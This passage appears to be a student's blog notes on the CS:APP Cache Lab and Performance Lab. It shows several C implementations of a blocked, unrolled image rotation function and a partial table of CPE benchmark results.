<p>The following figure shows how matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> is transformed into matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. Matrix is partitioned by multiple
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="4.399ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 1944.4 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mn" transform="translate(1444.4,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g></g></svg></mjx-container></span> blocks and these blocks are
indexed from 1 to 16. Index <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.009ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 888 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g></svg></mjx-container></span> in
matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.697ex" height="1.62ex" role="img" focusable="false" viewBox="0 -716 750 716"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g></g></g></svg></mjx-container></span> is transformed to index
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.76ex" height="1.717ex" role="img" focusable="false" viewBox="0 -759 1219.7 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(975.3,363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g></g></g></svg></mjx-container></span> in matrix <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container></span>. Conflict blocks are marked in color
orange and non-conflict blocks are marked green.</p>
<p><img src="/images/csapp/cachelab.png"></p>
<p>Our goal is to minimize the conflict misses taking place in orange
blocks. For <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="6.662ex" height="1.557ex" role="img" focusable="false" viewBox="0 -666 2944.4 688"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mn" transform="translate(1944.4,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container></span> matrices, we make
use of local variables. For <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="6.662ex" height="1.581ex" role="img" focusable="false" viewBox="0 -677 2944.4 699"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1222.2,0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mn" transform="translate(1944.4,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container></span>
matrices, we have to employ some tricks to reduce conflicts as the cache
layout becomes much more complicated.</p>
<h1 id="lab-5-performance-lab">Lab 5: Performance Lab</h1>
<p>In this lab, you are prompted to optimize the performance of a
rotation function and a convolution function for a 2D image (matrix).
Basically, we will leverage the following optimization techniques: code
motion, function inlining, blocking, loop unrolling, memory load
reduction, etc.</p>
<p><strong>Optimizing Rotation</strong></p>
<p>I tried the following versions of function <code>rotation</code>:</p>
<ul>
<li><code>naive_rotate</code>: iterate over all rows and columns in
order to rotate each element.</li>
<li><code>rotate_1</code>: 8 * 8 blocking plus loop unrolling.</li>
<li><code>rotate_2</code>: 8 * 8 blocking, loop unrolling, plus
temporary caching.</li>
<li><code>rotate_3</code>: 8 * 8 blocking, loop unrolling, plus marco
<code>RIDX</code> reduction.</li>
<li><code>rotate_4</code>: 4 * 4 blocking, loop unrolling, plus marco
<code>RIDX</code> reduction.</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">naive_rotate</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i++)</span><br><span class="line">	    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j++)</span><br><span class="line">	        dst[<span class="built_in">RIDX</span>(dim<span class="number">-1</span>-j, i, dim)] = src[<span class="built_in">RIDX</span>(i, j, dim)];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate_1</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i += <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j += <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> (k = i; k &lt; i + <span class="number">8</span>; ++k) {</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">1</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">0</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">2</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">1</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">3</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">2</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">4</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">3</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">5</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">4</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">6</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">5</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">7</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">6</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">8</span> - j, k, dim)] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">7</span>, dim)];</span><br><span class="line">            }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate_2</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    pixel Temp[<span class="number">8</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i += <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j += <span class="number">8</span>) {</span><br><span class="line">            <span class="keyword">for</span> (k = i; k &lt; i + <span class="number">8</span>; ++k) {</span><br><span class="line">                Temp[<span class="number">0</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">0</span>, dim)];</span><br><span class="line">                Temp[<span class="number">1</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">1</span>, dim)];</span><br><span class="line">                Temp[<span class="number">2</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">2</span>, dim)];</span><br><span class="line">                Temp[<span class="number">3</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">3</span>, dim)];</span><br><span class="line">                Temp[<span class="number">4</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">4</span>, dim)];</span><br><span class="line">                Temp[<span class="number">5</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">5</span>, dim)];</span><br><span class="line">                Temp[<span class="number">6</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">6</span>, dim)];</span><br><span class="line">                Temp[<span class="number">7</span>] = src[<span class="built_in">RIDX</span>(k, j + <span class="number">7</span>, dim)];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">1</span> - j, k, dim)] = Temp[<span class="number">0</span>];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">2</span> - j, k, dim)] = Temp[<span class="number">1</span>];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">3</span> - j, k, dim)] = Temp[<span class="number">2</span>]; </span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">4</span> - j, k, dim)] = Temp[<span class="number">3</span>];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">5</span> - j, k, dim)] = Temp[<span class="number">4</span>];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">6</span> - j, k, dim)] = Temp[<span class="number">5</span>];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">7</span> - j, k, dim)] = Temp[<span class="number">6</span>];</span><br><span class="line">                dst[<span class="built_in">RIDX</span>(dim - <span class="number">8</span> - j, k, dim)] = Temp[<span class="number">7</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate_3</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i, j, k, d_src, d_dst;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i += <span class="number">8</span>)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j += <span class="number">8</span>) {</span><br><span class="line">            <span class="keyword">for</span> (k = i; k &lt; i + <span class="number">8</span>; ++k) {</span><br><span class="line">                d_src = <span class="built_in">RIDX</span>(k, j, dim);</span><br><span class="line">                d_dst = <span class="built_in">RIDX</span>(dim - <span class="number">1</span> - j, k, dim);</span><br><span class="line">                dst[d_dst - <span class="number">0</span> * dim] = src[d_src + <span class="number">0</span>];</span><br><span class="line">                dst[d_dst - <span class="number">1</span> * dim] = src[d_src + <span class="number">1</span>];</span><br><span class="line">                dst[d_dst - <span class="number">2</span> * dim] = src[d_src + <span class="number">2</span>];</span><br><span class="line">                dst[d_dst - <span class="number">3</span> * dim] = src[d_src + <span class="number">3</span>];</span><br><span class="line">                dst[d_dst - <span class="number">4</span> * dim] = src[d_src + <span class="number">4</span>];</span><br><span class="line">                dst[d_dst - <span class="number">5</span> * dim] = src[d_src + <span class="number">5</span>];</span><br><span class="line">                dst[d_dst - <span class="number">6</span> * dim] = src[d_src + <span class="number">6</span>];</span><br><span class="line">                dst[d_dst - <span class="number">7</span> * dim] = src[d_src + <span class="number">7</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate_4</span><span class="params">(<span class="type">int</span> dim, pixel *src, pixel *dst)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i, j, k, d_src, d_dst;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dim; i += <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; dim; j += <span class="number">4</span>) {</span><br><span class="line">            <span class="keyword">for</span> (k = i; k &lt; i + <span class="number">4</span>; ++k) {</span><br><span class="line">                d_src = <span class="built_in">RIDX</span>(k, j, dim);</span><br><span class="line">                d_dst = <span class="built_in">RIDX</span>(dim - <span class="number">1</span> - j, k, dim);</span><br><span class="line">                dst[d_dst - <span class="number">0</span> * dim] = src[d_src + <span class="number">0</span>];</span><br><span class="line">                dst[d_dst - <span class="number">1</span> * dim] = src[d_src + <span class="number">1</span>];</span><br><span class="line">                dst[d_dst - <span class="number">2</span> * dim] = src[d_src + <span class="number">2</span>];</span><br><span class="line">                dst[d_dst - <span class="number">3</span> * dim] = src[d_src + <span class="number">3</span>];</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>Results are (note that your results may differ from here because of
machine difference):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Rotate: Version = rotate_0: naive implementation:</span><br><span class="line">Dim		        64	    128	    256	    512	    1024	Mean</span><br><span class="line">Your CPEs	    1.1	    1.5	    3.3	    4.7	    6.6</span><br><span class="line">Baseline CPEs	14.7	40.1	46.4	65.9	94.5</span><br><span class="line">Speedup		    13.3	26.0	13.9	14.0	14.3	15.7</span><br><span class="line"></span><br><span class="line">Rotate: Version = rotate_1: 8*8 blocking + loop unrolling:</span><br><span class="line">Dim		        64	    128	    256	    512	    1024	Mean</span><br><span class="line">Your CPEs	    1.2	    1.2	    1.3	    1.7	    1.7</span><br><span class="line">Baseline CPEs	14.7	40.1	